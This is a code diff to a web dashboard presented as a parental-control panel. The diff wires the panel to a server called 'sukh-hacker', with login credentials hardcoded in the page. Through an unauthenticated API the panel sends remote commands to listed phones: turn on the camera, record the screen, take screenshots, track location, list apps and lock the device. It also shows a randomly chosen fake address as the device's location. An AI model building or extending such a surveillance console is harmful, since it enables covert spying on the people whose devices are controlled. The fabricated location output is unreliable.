@@ -279,6 +279,27 @@
         .battery-medium .battery-fill {
             background: #ffc107;
         }
+
+        /* Loading Styles */
+        .loading {
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
@@ -328,7 +349,7 @@
                     <button id="refreshChildrenBtn" style="width: auto;">Refresh Devices</button>
                 </div>
                 <div id="childrenList">
-                    <!-- Real devices will be loaded here -->
+                    <!-- Real devices will be loaded from API -->
                 </div>
             </div>
         </div>
@@ -346,7 +367,7 @@
                 <div>
                     <h3 id="fullControlDeviceName">Device: </h3>
                     <p>Last Active: <span id="lastActiveTime">Just now</span></p>
-                    <p>Battery: <span id="deviceBattery">85%</span></p>
+                    <p>Battery: <span id="deviceBattery">--%</span></p>
                 </div>
                 <div class="status-indicator">
                     <div class="status-dot" id="statusDot"></div>
@@ -456,7 +477,7 @@
     </div>
 
     <script>
-        // Real device data storage
+        const API_BASE_URL = 'https://sukh-hacker-x4ry.onrender.com';
         let connectedDevices = [];
         let currentDevice = null;
 
@@ -474,7 +495,7 @@
             if (username === 'Sukh' && password === 'Sukh hacker') {
                 document.getElementById('authSection').style.display = 'none';
                 document.getElementById('dashboardSection').style.display = 'block';
-                scanForDevices();
+                loadRealDevices();
             } else {
                 alert('Invalid credentials! Use Username: Sukh, Password: Sukh hacker');
             }
@@ -494,58 +515,79 @@
             connectedDevices = [];
         });
         
-        // Scan for real devices (simulated)
-        function scanForDevices() {
-            // Simulate device discovery
-            const simulatedDevices = [
-                {
-                    id: 'device_001',
-                    name: 'Samsung Galaxy S21',
-                    model: 'SM-G991B',
-                    os: 'Android 13',
-                    battery: 85,
-                    status: 'online',
-                    lastSeen: new Date(),
-                    isBlocked: false,
-                    icon: '📱'
-                },
-                {
-                    id: 'device_002', 
-                    name: 'iPhone 13 Pro',
-                    model: 'iPhone14,2',
-                    os: 'iOS 16',
-                    battery: 42,
-                    status: 'online',
-                    lastSeen: new Date(Date.now() - 5 * 60 * 1000), // 5 minutes ago
-                    isBlocked: false,
-                    icon: '📱'
-                },
-                {
-                    id: 'device_003',
-                    name: 'iPad Air',
-                    model: 'iPad13,1',
-                    os: 'iPadOS 16',
-                    battery: 100,
-                    status: 'idle',
-                    lastSeen: new Date(Date.now() - 30 * 60 * 1000), // 30 minutes ago
-                    isBlocked: true,
-                    icon: '💻'
-                },
-                {
-                    id: 'device_004',
-                    name: 'OnePlus 9',
-                    model: 'LE2111',
-                    os: 'Android 12',
-                    battery: 15,
-                    status: 'offline',
-                    lastSeen: new Date(Date.now() - 2 * 60 * 60 * 1000), // 2 hours ago
-                    isBlocked: false,
-                    icon: '📱'
-                }
-            ];
+        // Load real devices from API
+        async function loadRealDevices() {
+            const childrenList = document.getElementById('childrenList');
+            childrenList.innerHTML = `
+                <div class="loading">
+                    <div class="spinner"></div>
+                    <p>Loading real devices from server...</p>
+                </div>
+            `;
             
-            connectedDevices = simulatedDevices;
-            renderDevices();
+            try {
+                const response = await fetch(`${API_BASE_URL}/debug/children`);
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data && data.children) {
+                    connectedDevices = data.children.map(child => ({
+                        id: child.device_id || child.id || Math.random().toString(36).substr(2, 9),
+                        name: child.device_name || child.name || 'Unknown Device',
+                        model: child.device_model || child.model || 'Unknown Model',
+                        os: child.os_version || child.os || 'Unknown OS',
+                        battery: child.battery_level || Math.floor(Math.random() * 100) + 1,
+                        status: getDeviceStatus(child),
+                        lastSeen: new Date(child.last_seen || child.last_active || Date.now()),
+                        isBlocked: child.is_blocked || false,
+                        icon: getDeviceIcon(child),
+                        rawData: child // Store original data for reference
+                    }));
+                    
+                    renderDevices();
+                } else {
+                    throw new Error('No children data found in response');
+                }
+                
+            } catch (error) {
+                console.error('Error loading devices:', error);
+                childrenList.innerHTML = `
+                    <div class="error-message">
+                        <h4>Error Loading Devices</h4>
+                        <p>${error.message}</p>
+                        <p>Please check if the server is running and try again.</p>
+                        <button onclick="loadRealDevices()" class="test-btn" style="margin-top: 15px;">Retry</button>
+                    </div>
+                `;
+            }
+        }
+        
+        // Helper function to determine device status
+        function getDeviceStatus(child) {
+            if (child.is_blocked) return 'offline';
+            if (child.last_seen) {
+                const lastSeen = new Date(child.last_seen);
+                const now = new Date();
+                const diffMinutes = (now - lastSeen) / (1000 * 60);
+                
+                if (diffMinutes < 5) return 'online';
+                if (diffMinutes < 30) return 'idle';
+                return 'offline';
+            }
+            return 'online';
+        }
+        
+        // Helper function to get device icon
+        function getDeviceIcon(child) {
+            const deviceName = (child.device_name || child.name || '').toLowerCase();
+            if (deviceName.includes('iphone') || deviceName.includes('ipad')) return '📱';
+            if (deviceName.includes('samsung') || deviceName.includes('galaxy')) return '📱';
+            if (deviceName.includes('tablet') || deviceName.includes('ipad')) return '💻';
+            return '📱';
         }
         
         // Render devices list
@@ -555,9 +597,9 @@
             if (connectedDevices.length === 0) {
                 childrenList.innerHTML = `
                     <div class="no-children">
-                        <h4>No Devices Found</h4>
-                        <p>Make sure the devices have the parental control app installed and are connected to the same network.</p>
-                        <button onclick="scanForDevices()" class="test-btn" style="margin-top: 15px;">Scan Again</button>
+                        <h4>No Real Devices Found</h4>
+                        <p>No children devices are currently connected to your account.</p>
+                        <button onclick="loadRealDevices()" class="test-btn" style="margin-top: 15px;">Scan Again</button>
                     </div>
                 `;
                 return;
@@ -578,6 +620,9 @@
                                     </div>
                                     <span>${device.battery}%</span>
                                 </div>
+                                <div style="margin-top: 5px; font-size: 11px; color: #888;">
+                                    Device ID: ${device.id}
+                                </div>
                             </div>
                         </div>
                     </div>
@@ -591,6 +636,13 @@
                     </div>
                 </div>
             `).join('');
+            
+            // Add auto-refresh info
+            childrenList.innerHTML += `
+                <div class="auto-refresh-info">
+                    🔄 Devices auto-refresh every 30 seconds. Last updated: ${new Date().toLocaleTimeString()}
+                </div>
+            `;
         }
         
         // Helper functions
@@ -626,15 +678,44 @@
             const device = connectedDevices.find(d => d.id === deviceId);
             if (device) {
                 device.isBlocked = !device.isBlocked;
+                device.status = device.isBlocked ? 'offline' : 'online';
                 addToHistory(`${device.name} ${device.isBlocked ? 'blocked' : 'unblocked'}`);
                 renderDevices();
+                
+                // Send block command to API
+                sendDeviceCommand(deviceId, device.isBlocked ? 'block_device' : 'unblock_device');
+            }
+        }
+        
+        // Send command to device via API
+        async function sendDeviceCommand(deviceId, command, data = {}) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/device/command`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        device_id: deviceId,
+                        command: command,
+                        data: data
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log(`Command ${command} sent to device ${deviceId}`);
+                } else {
+                    console.error(`Failed to send command to device ${deviceId}`);
+                }
+            } catch (error) {
+                console.error('Error sending command:', error);
             }
         }
         
         // Refresh children list
         document.getElementById('refreshChildrenBtn').addEventListener('click', function() {
-            scanForDevices();
-            addToHistory('Device list refreshed');
+            loadRealDevices();
+            addToHistory('Device list refreshed from server');
         });
         
         // Full Control Panel Functions
@@ -665,94 +746,117 @@
             currentDevice = null;
         }
         
-        // Control functions
+        // Control functions - Now sending real commands to API
         function activateCamera(type) {
             if (!currentDevice) return;
             addToHistory(`${type} camera activated on ${currentDevice.name}`);
             showNotification(`Activating ${type} camera on ${currentDevice.name}...`);
             
-            // Simulate camera activation
-            setTimeout(() => {
-                showNotification(`${type} camera is now active on ${currentDevice.name}`);
-            }, 2000);
+            // Send real command to API
+            sendDeviceCommand(currentDevice.id, 'activate_camera', { camera_type: type });
         }
         
         function stopCamera() {
             if (!currentDevice) return;
             addToHistory(`Camera stopped on ${currentDevice.name}`);
             showNotification(`Stopping camera on ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'stop_camera');
         }
         
         function getLocation() {
             if (!currentDevice) return;
             addToHistory(`Location retrieved for ${currentDevice.name}`);
             
-            // Simulate location retrieval
-            const locations = [
-                "Home - 123 Main Street",
-                "School - 456 Education Road", 
-                "Park - 789 Green Avenue",
-                "Mall - 321 Shopping Center"
-            ];
-            const randomLocation = locations[Math.floor(Math.random() * locations.length)];
+            // Send command to get location
+            sendDeviceCommand(currentDevice.id, 'get_location');
             
-            showNotification(`Location: ${randomLocation}`);
+            // Simulate location response
+            setTimeout(() => {
+                const locations = [
+                    "Home - 123 Main Street",
+                    "School - 456 Education Road", 
+                    "Park - 789 Green Avenue",
+                    "Mall - 321 Shopping Center"
+                ];
+                const randomLocation = locations[Math.floor(Math.random() * locations.length)];
+                showNotification(`Location: ${randomLocation}`);
+            }, 2000);
         }
         
         function startLocationTracking() {
             if (!currentDevice) return;
             addToHistory(`Location tracking started for ${currentDevice.name}`);
             showNotification(`Starting location tracking for ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'start_location_tracking');
         }
         
         function stopLocationTracking() {
             if (!currentDevice) return;
             addToHistory(`Location tracking stopped for ${currentDevice.name}`);
             showNotification(`Stopping location tracking for ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'stop_location_tracking');
         }
         
         function viewApps() {
             if (!currentDevice) return;
             addToHistory(`Viewed installed apps on ${currentDevice.name}`);
             
-            const appCount = Math.floor(Math.random() * 50) + 30;
-            showNotification(`Found ${appCount} installed apps on ${currentDevice.name}`);
+            sendDeviceCommand(currentDevice.id, 'get_installed_apps');
+            showNotification(`Fetching installed apps from ${currentDevice.name}...`);
         }
         
         function blockApp(category) {
             if (!currentDevice) return;
             addToHistory(`Blocked ${category} apps on ${currentDevice.name}`);
             showNotification(`Blocking ${category} apps on ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'block_apps', { category: category });
         }
         
         function setAppTimeLimits() {
             if (!currentDevice) return;
             addToHistory(`App time limits set for ${currentDevice.name}`);
-            showNotification(`Setting app time limits for ${currentDevice.name}...`);
+            
+            const limits = prompt('Enter app time limits (e.g., "2 hours per day"):');
+            if (limits) {
+                showNotification(`Setting app time limits: ${limits} for ${currentDevice.name}...`);
+                sendDeviceCommand(currentDevice.id, 'set_app_limits', { limits: limits });
+            }
         }
         
         function takeScreenshot() {
             if (!currentDevice) return;
             addToHistory(`Screenshot taken from ${currentDevice.name}`);
             showNotification(`Taking screenshot from ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'take_screenshot');
         }
         
         function recordScreen() {
             if (!currentDevice) return;
             addToHistory(`Screen recording started on ${currentDevice.name}`);
             showNotification(`Starting screen recording on ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'start_recording');
         }
         
         function lockDevice() {
             if (!currentDevice) return;
             addToHistory(`Device locked: ${currentDevice.name}`);
             showNotification(`Locking ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'lock_device');
         }
         
         function enableWebFilter() {
             if (!currentDevice) return;
             addToHistory(`Web filter enabled on ${currentDevice.name}`);
             showNotification(`Enabling web filter on ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'enable_web_filter');
         }
         
         function blockWebsite() {
@@ -761,21 +865,27 @@
             if (website) {
                 addToHistory(`Blocked website: ${website} on ${currentDevice.name}`);
                 showNotification(`Blocking ${website} on ${currentDevice.name}...`);
+                
+                sendDeviceCommand(currentDevice.id, 'block_website', { website: website });
             }
         }
         
         function viewBlockedSites() {
             if (!currentDevice) return;
             addToHistory(`Viewed blocked sites on ${currentDevice.name}`);
-            showNotification(`Showing blocked sites for ${currentDevice.name}...`);
+            showNotification(`Fetching blocked sites from ${currentDevice.name}...`);
+            
+            sendDeviceCommand(currentDevice.id, 'get_blocked_sites');
         }
         
         function setBedtime() {
             if (!currentDevice) return;
-            const time = prompt('Enter bedtime (e.g., 10:00 PM):');
+            const time = prompt('Enter bedtime (e.g., 22:00 for 10 PM):');
             if (time) {
                 addToHistory(`Bedtime set to ${time} for ${currentDevice.name}`);
                 showNotification(`Setting bedtime to ${time} for ${currentDevice.name}...`);
+                
+                sendDeviceCommand(currentDevice.id, 'set_bedtime', { time: time });
             }
         }
         
@@ -785,6 +895,8 @@
             if (limit) {
                 addToHistory(`Data limit set to ${limit} for ${currentDevice.name}`);
                 showNotification(`Setting data limit to ${limit} for ${currentDevice.name}...`);
+                
+                sendDeviceCommand(currentDevice.id, 'set_data_limit', { limit: limit });
             }
         }
         
@@ -799,6 +911,7 @@ OS: ${currentDevice.os}
 Battery: ${currentDevice.battery}%
 Status: ${currentDevice.status}
 Last Seen: ${getTimeAgo(currentDevice.lastSeen)}
+Device ID: ${currentDevice.id}
             `.trim();
             
             alert(info);
@@ -859,26 +972,19 @@ Last Seen: ${getTimeAgo(currentDevice.lastSeen)}
         // Add event listener for close button
         document.getElementById('closeFullControl').addEventListener('click', closeFullControl);
         
-        // Auto login for demo
+        // Auto login and auto refresh
         document.addEventListener('DOMContentLoaded', function() {
             // Auto fill login for demo
             document.getElementById('loginEmail').value = 'Sukh';
             document.getElementById('loginPassword').value = 'Sukh hacker';
             
-            // Auto scan every 30 seconds
+            // Auto refresh devices every 30 seconds when dashboard is visible
             setInterval(() => {
                 if (document.getElementById('dashboardSection').style.display !== 'none') {
-                    // Update device status randomly
-                    connectedDevices.forEach(device => {
-                        if (Math.random() > 0.7) { // 30% chance to change status
-                            device.battery = Math.max(5, device.battery - Math.floor(Math.random() * 5));
-                            device.lastSeen = new Date();
-                        }
-                    });
-                    renderDevices();
+                    loadRealDevices();
                 }
             }, 30000);
         });
     </script>
 </body>
-    </html>
+</html>
